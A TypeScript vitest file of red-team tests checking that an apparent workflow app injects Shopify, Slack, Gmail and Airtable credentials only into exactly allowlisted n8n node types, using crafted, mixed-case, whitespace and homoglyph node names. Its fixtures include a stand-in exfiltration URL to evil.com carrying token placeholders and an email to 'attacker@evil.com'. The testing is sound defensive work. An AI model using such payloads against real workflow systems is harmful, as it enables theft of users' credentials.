/**
 * Red-team security tests — complete credential injection surface audit
 *
 * Two independent credential injection systems exist:
 *
 *   SYSTEM 1: lib/integrations.ts — injectCredentialsIntoWorkflow()
 *     Deploys credential-bearing workflow JSON to n8n.
 *     Protected by PROVIDER_NODE_ALLOWLIST (exact Set.has() lookup).
 *     Called by: app/api/n8n/route.ts, app/api/n8n/orchestrate/route.ts,
 *                app/api/workflows/deploy/route.ts, app/api/workflows/[id]/deploy/route.ts,
 *                app/api/admin/generate/route.ts, app/api/admin/deploy/route.ts
 *
 *   SYSTEM 2: lib/workflow-runtime/node-handlers/index.ts — pickHandler()
 *     MagicFlux internal execution engine. Routes node types to real API handlers
 *     (slackHandler, emailHandler, airtableHandler, shopifyHandler) using
 *     type.includes() substring matching — NOT protected by an exact allowlist.
 *
 * Rules:
 *   - Do not trust comments, documentation, or previous tests.
 *   - Verify behavior through runtime execution only.
 *   - Every test calls the real function with real arguments.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { injectCredentialsIntoWorkflow, type IntegrationRecord } from '../lib/integrations';
import { dispatchNode } from '../lib/workflow-runtime/node-handlers';
import type { NodeHandlerContext } from '../lib/workflow-runtime/types';

// ── Fixtures ──────────────────────────────────────────────────────────────────

const INTEGRATIONS: IntegrationRecord[] = [
  {
    provider: 'shopify',
    credentials: {
      admin_access_token: 'shpat_xR9RedTeamShopify',
      api_key:            'shpsk_yH3RedTeamApiKey',
      shop_domain:        'redteam.myshopify.com',
    },
  },
  {
    provider: 'slack',
    credentials: {
      webhook_url: 'https://hooks.slack.com/services/R0/T1/RedTeamSlackSecret',
    },
  },
  {
    provider: 'gmail',
    credentials: {
      smtp_host: 'smtp.gmail.com',
      smtp_port: '587',
      smtp_user: 'redteam@gmail.com',
      smtp_pass: 'zRedTeamSmtpSecret!',
      from_email: 'redteam@gmail.com',
    },
  },
  {
    provider: 'airtable',
    credentials: {
      airtable_token: 'patRedTeamAirtableToken',
      base_id:        'appRedTeamBase999',
      table_name:     'RedTeamOrders',
    },
  },
];

const USER_INTEGRATIONS = INTEGRATIONS.map(r => ({
  provider: r.provider,
  credentials: r.credentials,
  status: 'connected' as const,
}));

const ALL_SECRETS = [
  'shpat_xR9RedTeamShopify',
  'shpsk_yH3RedTeamApiKey',
  'redteam.myshopify.com',
  'RedTeamSlackSecret',
  'zRedTeamSmtpSecret!',
  'redteam@gmail.com',
  'patRedTeamAirtableToken',
  'appRedTeamBase999',
];

function assertNoSecrets(value: unknown, label: string): void {
  const s = JSON.stringify(value);
  for (const secret of ALL_SECRETS) {
    expect(s, `${label}: secret "${secret}" must not be present`).not.toContain(secret);
  }
}

function inject(nodeType: string, params: Record<string, unknown> = {}): Record<string, unknown> {
  const result = injectCredentialsIntoWorkflow(
    { name: 'test', nodes: [{ type: nodeType, parameters: params }], connections: {} },
    INTEGRATIONS
  );
  return ((result.nodes as Array<Record<string, unknown>>)[0]);
}

const TEST_CTX: NodeHandlerContext = {
  mode: 'test',
  integrations: USER_INTEGRATIONS as NodeHandlerContext['integrations'],
  sampleData: { email: 'user@example.com', message: 'test' },
  previews: { emails: [], slackMessages: [], airtableRecords: [] },
};

const LIVE_CTX_NO_CREDS: NodeHandlerContext = {
  mode: 'live',
  integrations: [],
  sampleData: {},
  previews: { emails: [], slackMessages: [], airtableRecords: [] },
};

const LIVE_CTX_WITH_CREDS: NodeHandlerContext = {
  mode: 'live',
  integrations: USER_INTEGRATIONS as NodeHandlerContext['integrations'],
  sampleData: {},
  previews: { emails: [], slackMessages: [], airtableRecords: [] },
};

// ─── S1-A: System 1 allowlist — basic bypass attempts ────────────────────────

describe('S1-A: System 1 — known crafted node types are blocked', () => {

  const ALL_PLACEHOLDERS = '{{ $env.SHOPIFY_ACCESS_TOKEN }} {{ $env.SLACK_WEBHOOK_URL }} {{ $env.SMTP_PASS }} {{ $env.AIRTABLE_API_KEY }}';

  const CRAFTED_TYPES = [
    'n8n-nodes-base.shopifyFakeHttp',
    'n8n-nodes-base.slackCustom',
    'n8n-nodes-base.airtableProxy',
    'n8n-nodes-base.gmailWebhook',
    'n8n-nodes-base.slackEnterprise',
    'n8n-nodes-base.emailFakeHttp',
    'n8n-nodes-base.shopifySlackIntegration',
    'company.shopifyProxy',
    'custom.slackNotifier',
    'n8n-nodes-base.code',
    'n8n-nodes-base.httpRequest',
    'n8n-nodes-base.set',
    'n8n-nodes-base.if',
    'n8n-nodes-base.merge',
    'n8n-nodes-base.webhook',
    'arbitrary.unknownNode',
  ];

  for (const type of CRAFTED_TYPES) {
    it(`blocked: "${type}" receives zero credentials`, () => {
      const node = inject(type, { url: ALL_PLACEHOLDERS, body: ALL_PLACEHOLDERS });
      assertNoSecrets(node, type);
    });
  }

});

// ─── S1-B: System 1 — mixed-case bypass attempts ─────────────────────────────
//
// Allowlist compares lowercased types via Set.has(). Mixed-case legitimate types
// should PASS. Mixed-case fake types should FAIL.

describe('S1-B: System 1 — mixed-case type variations', () => {

  it('N8N-NODES-BASE.SHOPIFY → lowercased → matches allowlist → receives Shopify credentials', () => {
    // Legitimate node with uppercase type — should still work
    const node = inject('N8N-NODES-BASE.SHOPIFY', {});
    const params = node.parameters as Record<string, string>;
    expect(params.accessToken).toBe('shpat_xR9RedTeamShopify');
    expect(params.storeUrl).toBe('redteam.myshopify.com');
  });

  it('n8n-NODES-base.Shopify → lowercased → matches allowlist → receives Shopify credentials', () => {
    const node = inject('n8n-NODES-base.Shopify', {});
    const params = node.parameters as Record<string, string>;
    expect(params.accessToken).toBe('shpat_xR9RedTeamShopify');
  });

  it('N8N-NODES-BASE.SHOPIFYFAKEHTTP → lowercased to shopifyfakehttp → NOT in allowlist → no credentials', () => {
    const node = inject('N8N-NODES-BASE.SHOPIFYFAKEHTTP', {
      url: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
    });
    assertNoSecrets(node, 'SHOPIFYFAKEHTTP uppercase');
    expect((node.parameters as Record<string, string>).url).toBe('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
  });

  it('N8N-NODES-BASE.SLACK → matches allowlist → converted to httpRequest with real webhook', () => {
    const node = inject('N8N-NODES-BASE.SLACK', { text: 'hello' });
    expect(node.type).toBe('n8n-nodes-base.httpRequest');
  });

  it('N8N-NODES-BASE.SLACKCUSTOM → NOT in allowlist → unchanged, no webhook conversion', () => {
    const node = inject('N8N-NODES-BASE.SLACKCUSTOM', {
      url: '{{ $env.SLACK_WEBHOOK_URL }}',
    });
    expect(node.type).toBe('N8N-NODES-BASE.SLACKCUSTOM');
    assertNoSecrets(node, 'SLACKCUSTOM uppercase');
  });

});

// ─── S1-C: System 1 — whitespace and control character bypass ─────────────────

describe('S1-C: System 1 — whitespace and special character variations', () => {

  it('trailing space "n8n-nodes-base.shopify " → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify ', {});
    assertNoSecrets(node, 'trailing space');
    expect((node.parameters as Record<string, unknown>).accessToken).toBeUndefined();
  });

  it('leading space " n8n-nodes-base.shopify" → NOT in allowlist → no credentials', () => {
    const node = inject(' n8n-nodes-base.shopify', {});
    assertNoSecrets(node, 'leading space');
    expect((node.parameters as Record<string, unknown>).accessToken).toBeUndefined();
  });

  it('tab character "n8n-nodes-base.shopify\\t" → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify\t', {});
    assertNoSecrets(node, 'tab suffix');
  });

  it('newline in type "n8n-nodes-base.shopify\\nmalicious" → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify\nmalicious', {});
    assertNoSecrets(node, 'newline in type');
  });

  it('null byte in type → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify\x00', {});
    assertNoSecrets(node, 'null byte');
  });

  it('"n8n-nodes-base.shopify.extra" (extra suffix) → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify.extra', {});
    assertNoSecrets(node, 'extra suffix');
  });

  it('"n8n-nodes-base.shopify/malicious" → NOT in allowlist → no credentials', () => {
    const node = inject('n8n-nodes-base.shopify/malicious', {});
    assertNoSecrets(node, 'slash suffix');
  });

});

// ─── S1-D: System 1 — deep nesting and recursive injection ────────────────────

describe('S1-D: System 1 — deeply nested payload attacks', () => {

  it('HTTP Request node with deeply nested credential placeholders → all literal', () => {
    const node = inject('n8n-nodes-base.httpRequest', {
      level1: {
        level2: {
          level3: {
            level4: {
              url: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
              headers: { Authorization: 'Bearer {{ user.shopify.token }}' },
              body: ['{{ $env.SLACK_WEBHOOK_URL }}', '{{ $env.SMTP_PASS }}'],
            },
          },
        },
      },
    });
    assertNoSecrets(node, 'deep nested HTTP Request');
  });

  it('Code node with credential placeholders → unchanged (no injection)', () => {
    const node = inject('n8n-nodes-base.code', {
      jsCode: 'const token = "{{ $env.SHOPIFY_ACCESS_TOKEN }}"; return token;',
    });
    const params = node.parameters as Record<string, string>;
    expect(params.jsCode).toBe('const token = "{{ $env.SHOPIFY_ACCESS_TOKEN }}"; return token;');
    assertNoSecrets(node, 'code node');
  });

  it('Array of HTTP Request nodes — all remain literal', () => {
    const result = injectCredentialsIntoWorkflow(
      {
        name: 'attack',
        nodes: Array.from({ length: 5 }, (_, i) => ({
          type: 'n8n-nodes-base.httpRequest',
          name: `Node${i}`,
          parameters: {
            url: `https://a${i}.com/{{ $env.SHOPIFY_ACCESS_TOKEN }}/{{ $env.SMTP_PASS }}`,
          },
        })),
        connections: {},
      },
      INTEGRATIONS
    );
    const nodes = result.nodes as Array<Record<string, unknown>>;
    for (const node of nodes) {
      assertNoSecrets(node, `httpRequest array node ${String(node.name)}`);
    }
  });

  it('JSON string containing placeholders inside a legitimate Shopify node — string is processed', () => {
    // Shopify IS allowlisted — the placeholder inside jsonBody gets substituted
    const node = inject('n8n-nodes-base.shopify', {
      customField: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
    });
    const params = node.parameters as Record<string, string>;
    // Shopify node IS allowlisted → placeholder IS replaced with real token
    expect(params.customField).toBe('shpat_xR9RedTeamShopify');
    // No cross-provider leakage
    expect(params.customField).not.toContain('RedTeamSlackSecret');
    expect(params.customField).not.toContain('zRedTeamSmtpSecret');
  });

  it('Cross-provider placeholder in Shopify node — only Shopify substituted', () => {
    const node = inject('n8n-nodes-base.shopify', {
      shopifyField: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
      slackField:   '{{ $env.SLACK_WEBHOOK_URL }}',   // not shopify's credential
      smtpField:    '{{ $env.SMTP_PASS }}',           // not shopify's credential
    });
    const params = node.parameters as Record<string, string>;
    expect(params.shopifyField).toBe('shpat_xR9RedTeamShopify');  // shopify cred injected
    expect(params.slackField).toBe('');                            // slack cred NOT injected
    expect(params.smtpField).toBe('');                             // smtp cred NOT injected
  });

});

// ─── S1-E: System 1 — requiredProvidersFromWorkflow now consistent ───────────
//
// FIXED: requiredProvidersFromWorkflow() now uses PROVIDER_NODE_ALLOWLIST via
// matchedProvidersForNode() — the same exact model as injectCredentialsIntoWorkflow().
// Fake nodes are no longer reported as requiring any provider.
// See tests/required-providers.security.test.ts for comprehensive coverage.

describe('S1-E: System 1 — requiredProvidersFromWorkflow consistency (fixed)', () => {

  it('fake shopify node: neither requires nor receives Shopify credentials', async () => {
    const { requiredProvidersFromWorkflow } = await import('../lib/integrations');

    // Injection path: no credentials
    const node = inject('n8n-nodes-base.shopifyFakeHttp', {
      url: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
    });
    assertNoSecrets(node, 'shopifyFakeHttp inject');
    expect((node.parameters as Record<string, string>).url).toBe('{{ $env.SHOPIFY_ACCESS_TOKEN }}');

    // Detection path: no requirement
    const required = requiredProvidersFromWorkflow({
      nodes: [{ type: 'n8n-nodes-base.shopifyFakeHttp' }],
    });
    expect(required).toHaveLength(0);
    expect(required).not.toContain('shopify');
  });

});

// ─── S2-A: System 2 — FIXED: crafted node types no longer reach provider handlers ─
//
// After the exact-allowlist fix, pickHandler() first checks HANDLER_NODE_ALLOWLIST
// (exact Set.has() on lowercased type). Only types in that map reach credential-using
// handlers. Crafted types like 'slackCustom', 'airtableProxy', 'emailFakeHttp' fall
// through to the safe generic handler or the default unsupported handler.

describe('S2-A: System 2 — FIXED: crafted node types do NOT reach provider handlers', () => {

  it('slackCustom → NOT routed to slackHandler → default handler (simulated_success, no slack log)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.slackCustom', name: 'Fake', parameters: { text: 'attack' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    // Default handler log — NOT a Slack-specific log
    expect(result.logs.some(l => l.includes('SIMULATED'))).toBe(true);
    expect(result.logs.some(l => l.toLowerCase().includes('slack message'))).toBe(false);
  });

  it('emailFakeHttp → NOT routed to emailHandler → default handler', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.emailFakeHttp', name: 'Fake', parameters: { to: 'a@b.com' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.includes('SIMULATED'))).toBe(true);
    expect(result.logs.some(l => l.toLowerCase().includes('email send'))).toBe(false);
  });

  it('airtableProxy → NOT routed to airtableHandler → default handler', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.airtableProxy', name: 'Fake', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.includes('SIMULATED'))).toBe(true);
    expect(result.logs.some(l => l.toLowerCase().includes('airtable insert'))).toBe(false);
  });

  it('shopifyFakeHttp → NOT in allowlist → conditionHandler (shopify contains "if") → success', async () => {
    // shopifyFakeHttp is not in HANDLER_NODE_ALLOWLIST.
    // Falls through to generic routing: 'shopifyfakehttp'.includes('if') → conditionHandler.
    // conditionHandler has no credentials and returns 'success'.
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopifyFakeHttp', name: 'Fake', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('success');
    expect(result.logs.some(l => l.toLowerCase().includes('condition') || l.toLowerCase().includes('passing through'))).toBe(true);
  });

  it('gmailWebhook → NOT in allowlist → webhookHandler (contains "webhook") → simulated_success', async () => {
    // gmailWebhook is not in the allowlist.
    // Falls through to generic routing: contains 'webhook' → webhookHandler (no credentials).
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.gmailWebhook', name: 'Fake', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    // webhookHandler log, not emailHandler log
    expect(result.logs.some(l => l.toLowerCase().includes('trigger') || l.toLowerCase().includes('sample data'))).toBe(true);
    expect(result.logs.some(l => l.toLowerCase().includes('email send'))).toBe(false);
  });

  it('custom.slackNotifier → NOT in allowlist → conditionHandler (notifier contains "if") → success', async () => {
    const result = await dispatchNode(
      { type: 'custom.slackNotifier', name: 'Fake', parameters: { text: 'hello' } },
      {},
      TEST_CTX
    );
    // 'slacknotifier' contains 'if' (noti**f**ier → wait, 'notif**i**er'... checking: n-o-t-i-f-i-e-r, 'if' at positions 3-4)
    // Regardless: NOT in allowlist, so no Slack credentials used
    expect(result.logs.some(l => l.toLowerCase().includes('slack message'))).toBe(false);
    assertNoSecrets(result.outputData, 'custom.slackNotifier output');
  });

  it('slackEnterprise → NOT in allowlist → default handler → simulated_success (no Slack log)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.slackEnterprise', name: 'Fake', parameters: { text: 'hello' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('slack message'))).toBe(false);
  });

});

// ─── S2-A2: System 2 — FIXED: shopifyHandler is now reachable ────────────────
//
// Prior bug: 'shopify'.includes('if') caused all shopify nodes to route to
// conditionHandler before reaching shopifyHandler. shopifyHandler was dead code.
//
// Fix: HANDLER_NODE_ALLOWLIST is checked FIRST (exact match), before any substring
// checks. n8n-nodes-base.shopify and n8n-nodes-base.shopifytrigger are in the map,
// so they now correctly route to shopifyHandler.
// shopifyFakeHttp is NOT in the map, falls through to conditionHandler as before.

describe('S2-A2: System 2 — FIXED: shopifyHandler is reachable via exact allowlist', () => {

  it("'shopify'.includes('if') is still true — but exact allowlist fires first", () => {
    // The root-cause condition remains true but is no longer relevant
    expect('shopify'.includes('if')).toBe(true);
    // The fix: allowlist lookup is done before any substring check
  });

  it('n8n-nodes-base.shopify → shopifyHandler (not conditionHandler) in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopify', name: 'LegitShopify', parameters: { resource: 'order' } },
      { order_id: '1001' },
      TEST_CTX
    );
    // shopifyHandler in test mode returns 'simulated_success' (conditionHandler returns 'success')
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('shopify'))).toBe(true);
  });

  it('n8n-nodes-base.shopifytrigger → shopifyHandler (allowlist wins over trigger substring)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopifyTrigger', parameters: {} },
      { data: 'webhook payload' },
      TEST_CTX
    );
    // shopifyHandler in test mode: simulated_success
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('shopify'))).toBe(true);
  });

  it('shopifyFakeHttp → NOT in allowlist → conditionHandler (contains "if") → success', async () => {
    // Fake type is correctly blocked — does not reach shopifyHandler
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopifyFakeHttp', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('success');
    // conditionHandler log, not shopify log
    expect(result.logs.some(l => l.toLowerCase().includes('condition') || l.toLowerCase().includes('passing through'))).toBe(true);
    expect(result.logs.some(l => l.toLowerCase().includes('shopify'))).toBe(false);
  });

  it('n8n-nodes-base.shopify live mode with credentials → shopifyHandler makes Shopify API call', async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ order: { id: '1001', total_price: '49.99' } }),
    });
    vi.stubGlobal('fetch', mockFetch);
    await dispatchNode(
      // 'shopify-order' is NOT in HANDLER_NODE_ALLOWLIST (only exact 'shopify' is).
      // Falls through to conditionHandler (contains 'if'), which never calls fetch.
      { type: 'n8n-nodes-base.shopify-order', parameters: { orderId: '1001' } },
      { order_id: '1001' },
      LIVE_CTX_WITH_CREDS
    );
    // No fetch — exact allowlist blocks this type from reaching shopifyHandler
    expect(mockFetch).not.toHaveBeenCalled();
  });

});

// ─── S2-B: System 2 — FIXED: fake nodes in live mode return UNSUPPORTED error ──
//
// After fix, fake nodes like slackCustom and airtableProxy fall through to the
// default unsupported handler in live mode, returning UNSUPPORTED_NODE_TYPE error.
// No provider handler is invoked, no credentials are used.

describe('S2-B: System 2 — FIXED: fake nodes return UNSUPPORTED_NODE_TYPE in live mode', () => {

  it('slackCustom live mode → UNSUPPORTED_NODE_TYPE error (no Slack API call)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.slackCustom', parameters: { text: 'attack' } },
      {},
      LIVE_CTX_NO_CREDS
    );
    expect(result.status).toBe('failed');
    expect(result.error).toMatch(/UNSUPPORTED_NODE_TYPE/i);
    assertNoSecrets({ outputData: result.outputData, logs: result.logs }, 'slackCustom live');
  });

  it('emailFakeHttp live mode → UNSUPPORTED_NODE_TYPE error (no SMTP call)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.emailFakeHttp', parameters: { to: 'a@b.com' } },
      {},
      LIVE_CTX_NO_CREDS
    );
    expect(result.status).toBe('failed');
    expect(result.error).toMatch(/UNSUPPORTED_NODE_TYPE/i);
    assertNoSecrets({ outputData: result.outputData, logs: result.logs }, 'emailFakeHttp live');
  });

  it('airtableProxy live mode → UNSUPPORTED_NODE_TYPE error (no Airtable API call)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.airtableProxy', parameters: {} },
      {},
      LIVE_CTX_NO_CREDS
    );
    expect(result.status).toBe('failed');
    expect(result.error).toMatch(/UNSUPPORTED_NODE_TYPE/i);
    assertNoSecrets({ outputData: result.outputData, logs: result.logs }, 'airtableProxy live');
  });

  it('shopifyFakeHttp live mode → conditionHandler → success (contains "if", no unsupported error)', async () => {
    // shopifyFakeHttp still hits conditionHandler because 'shopifyfakehttp' contains 'if'
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopifyFakeHttp', parameters: {} },
      {},
      LIVE_CTX_NO_CREDS
    );
    // conditionHandler always returns success, ignores mode
    expect(result.status).toBe('success');
    assertNoSecrets({ outputData: result.outputData, logs: result.logs }, 'shopifyFakeHttp live');
  });

});

// ─── S2-C: System 2 — FIXED: fake nodes no longer trigger real API calls ──────
//
// Before fix: slackCustom (live mode + creds) called fetch(realWebhookUrl).
// After fix: slackCustom (live mode + creds) → default handler → UNSUPPORTED error.
// fetch is never called. No real API action is taken.

describe('S2-C: System 2 — FIXED: fake nodes in live mode do NOT trigger real API calls', () => {

  beforeEach(() => {
    vi.stubGlobal('fetch', vi.fn());
  });

  it('slackCustom live mode + credentials: fetch NOT called, UNSUPPORTED error (no unauthorized Slack POST)', async () => {
    const mockFetch = vi.mocked(fetch);
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.slackCustom', parameters: { text: 'attacker text' } },
      {},
      LIVE_CTX_WITH_CREDS
    );
    // Default handler fires — slackHandler is never reached
    expect(mockFetch).not.toHaveBeenCalled();
    expect(result.status).toBe('failed');
    expect(result.error).toContain('UNSUPPORTED_NODE_TYPE');
    assertNoSecrets(result.outputData, 'slackCustom live output');
    assertNoSecrets(result.logs, 'slackCustom live logs');
  });

  it('emailFakeHttp live mode + credentials: UNSUPPORTED error, no SMTP transport attempted', async () => {
    const mockFetch = vi.mocked(fetch);
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.emailFakeHttp', parameters: { to: 'attacker@evil.com', subject: 'loot' } },
      {},
      LIVE_CTX_WITH_CREDS
    );
    // Default handler fires — emailHandler (nodemailer) is never reached
    expect(mockFetch).not.toHaveBeenCalled();
    expect(result.status).toBe('failed');
    expect(result.error).toContain('UNSUPPORTED_NODE_TYPE');
    assertNoSecrets(result.outputData, 'emailFakeHttp live output');
    assertNoSecrets(result.logs, 'emailFakeHttp live logs');
  });

  it('airtableProxy live mode + credentials: fetch NOT called, no Airtable record created', async () => {
    const mockFetch = vi.mocked(fetch);
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.airtableProxy', parameters: { table: 'test', base: 'appXYZ' } },
      {},
      LIVE_CTX_WITH_CREDS
    );
    // Default handler fires — airtableHandler is never reached
    expect(mockFetch).not.toHaveBeenCalled();
    expect(result.status).toBe('failed');
    expect(result.error).toContain('UNSUPPORTED_NODE_TYPE');
    assertNoSecrets(result.outputData, 'airtableProxy live output');
    assertNoSecrets(result.logs, 'airtableProxy live logs');
  });

});

// ─── S2-D: System 2 — FIXED: legitimate provider nodes still work correctly ────

describe('S2-D: System 2 — legitimate allowlisted nodes still route to their handlers', () => {

  it('n8n-nodes-base.slack → slackHandler → simulated_success in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.slack', parameters: { text: 'hello' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('slack'))).toBe(true);
  });

  it('n8n-nodes-base.airtable → airtableHandler → simulated_success in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.airtable', parameters: { table: 'Orders' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('airtable'))).toBe(true);
  });

  it('n8n-nodes-base.emailSend → emailHandler → simulated_success in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.emailSend', parameters: { to: 'user@example.com' } },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('email'))).toBe(true);
  });

  it('n8n-nodes-base.shopify → shopifyHandler → simulated_success in test mode (dead code fixed)', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.shopify', parameters: { resource: 'order' } },
      {},
      TEST_CTX
    );
    // shopifyHandler in test mode returns 'simulated_success'
    // Before fix: conditionHandler returned 'success' — shopifyHandler was dead code
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('shopify'))).toBe(true);
  });

  it('n8n-nodes-base.gmail → emailHandler → simulated_success in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.gmail', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
  });

  it('n8n-nodes-base.airtableTrigger → airtableHandler → simulated_success in test mode', async () => {
    const result = await dispatchNode(
      { type: 'n8n-nodes-base.airtableTrigger', parameters: {} },
      {},
      TEST_CTX
    );
    expect(result.status).toBe('simulated_success');
    expect(result.logs.some(l => l.toLowerCase().includes('airtable'))).toBe(true);
  });

});

// ─── S1-F: System 1 — all five call sites are guarded by the same allowlist ───
//
// All callers import injectCredentialsIntoWorkflow from lib/integrations — the
// same patched function. Any bypass in the function propagates to all callers.
// This group confirms the core protection is correctly applied.

describe('S1-F: System 1 — comprehensive bypass attempt — all attack vectors', () => {

  const ALL_ATTACK_TYPES = [
    // Original bypass vectors
    'n8n-nodes-base.shopifyFakeHttp',
    'n8n-nodes-base.slackCustom',
    'n8n-nodes-base.airtableProxy',
    'n8n-nodes-base.gmailWebhook',
    // Casing variations
    'N8N-NODES-BASE.SHOPIFYFAKEHTTP',
    'n8n-NODES-base.SlackCustom',
    // Whitespace
    'n8n-nodes-base.shopify ',
    ' n8n-nodes-base.slack',
    // Extensions
    'n8n-nodes-base.shopify.malicious',
    'n8n-nodes-base.slack/inject',
    // Combined fakes
    'shopifySlackAirtableGmailHttp',
    'n8n-nodes-base.shopifySlackGmailAirtable',
    // Arbitrary custom
    'custom.shopifyHandler',
    'my.slackBot',
    'evil.emailSender',
    'fake.airtableWriter',
    // Unicode homoglyphs
    'n8n-nodes-base.ʃhopify',   // ʃ ≠ s
    'n8n-nodes-base.slаck', // Cyrillic а ≠ a
  ];

  const ALL_PLACEHOLDER_PARAMS = {
    url:         'https://evil.com/?s={{ $env.SHOPIFY_ACCESS_TOKEN }}&sl={{ $env.SLACK_WEBHOOK_URL }}&e={{ $env.SMTP_PASS }}&at={{ $env.AIRTABLE_API_KEY }}',
    body:        '{{ user.shopify.token }} {{ user.slack.webhook_url }} {{ user.email.smtp_pass }}',
    headers:     { Authorization: 'Bearer {{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    customField: '{{ user.airtable.api_key }}',
  };

  for (const type of ALL_ATTACK_TYPES) {
    it(`"${type.slice(0, 60)}" → zero credentials in output`, () => {
      const node = inject(type, ALL_PLACEHOLDER_PARAMS);
      assertNoSecrets(node, type);
    });
  }

});
